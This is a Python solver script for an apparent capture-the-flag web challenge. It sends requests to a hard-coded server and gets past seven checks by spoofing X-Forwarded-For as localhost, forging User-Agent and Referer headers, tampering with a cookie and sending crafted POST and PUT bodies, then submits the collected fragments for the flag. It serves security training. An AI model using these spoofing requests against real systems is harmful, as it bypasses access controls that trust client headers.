#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HTUCTF 喵星信号塔 · 七塔导航 (1000pts) 一键复现

七座塔 = 七种 HTTP 通信规矩，各掉一颗 base64 星核碎片；
按 1->7 顺序直接拼接（不解码）提交 /tower/vault 得 flag。
"""
import re
import sys
import base64
import urllib.request

B = "http://103.163.47.230:32854"
frags = {}


def req(path, method="GET", data=None, headers=None):
    h = {"User-Agent": "curl/8.0"}
    if headers:
        h.update(headers)
    body = data.encode() if isinstance(data, str) else data
    r = urllib.request.Request(B + path, data=body, method=method, headers=h)
    with urllib.request.urlopen(r, timeout=15) as resp:
        return resp.read().decode("utf-8", "replace"), dict(resp.headers)


def main():
    # 1 回响塔：查询串参数
    html, _ = req("/tower/echo?code=MEOW7")
    frags[1] = re.search(r"碎片1号.*?：([A-Za-z0-9+/=]+)", html).group(1)

    # 2 信标塔：POST 表单，海上长明引路灯 = lighthouse
    html, _ = req("/tower/beacon", "POST", "signal=lighthouse",
                  {"Content-Type": "application/x-www-form-urlencoded"})
    frags[2] = re.search(r"碎片 2 号：([A-Za-z0-9+/=]+)", html).group(1)

    # 3 幽影塔：X-Forwarded-For 伪造本机，碎片在响应头
    html, hdr = req("/tower/ghost", headers={"X-Forwarded-For": "127.0.0.1"})
    frags[3] = hdr.get("X-Star-Core", "").split("=", 1)[1]

    # 4 镜塔：User-Agent 必须是 MeowBrowser，碎片藏在 JS fromCharCode 里
    html, _ = req("/tower/mirror", headers={"User-Agent": "MeowBrowser"})
    codes = [int(x) for x in re.search(r"fromCharCode\(([\d,]+)\)", html).group(1).split(",")]
    js = "".join(chr(c) for c in codes)          # console.log("★ 星核碎片 4 号：XXX")
    frags[4] = re.search(r"：([A-Za-z0-9+/=]+)", js).group(1)

    # 5 徽章塔：Cookie 改成 star_cat
    html, _ = req("/tower/badge", headers={"Cookie": "user=star_cat"})
    frags[5] = re.search(r"碎片 5 号：([A-Za-z0-9+/=]+)", html).group(1)

    # 6 罗盘塔：Referer
    html, _ = req("/tower/compass", headers={"Referer": "http://moonbase/launch"})
    frags[6] = re.search(r"碎片 6 号：([A-Za-z0-9+/=]+)", html).group(1)

    # 7 虚空塔：PUT + body rebirth
    html, _ = req("/tower/void", "PUT", "rebirth")
    frags[7] = re.search(r"碎片 7 号：([A-Za-z0-9+/=]+)", html).group(1)

    for i in range(1, 8):
        print(f"碎片{i}: {frags[i]}  ->  {base64.b64decode(frags[i]).decode()}")

    key = "".join(frags[i] for i in range(1, 8))
    print("\n拼接串:", key)

    html, _ = req("/tower/vault", "POST", "answer=" + urllib.parse.quote(key),
                  {"Content-Type": "application/x-www-form-urlencoded"})
    flag = re.search(r"HTUCTF\{[^}]+\}", html)
    print("FLAG:", flag.group(0) if flag else html[:400])


if __name__ == "__main__":
    main()
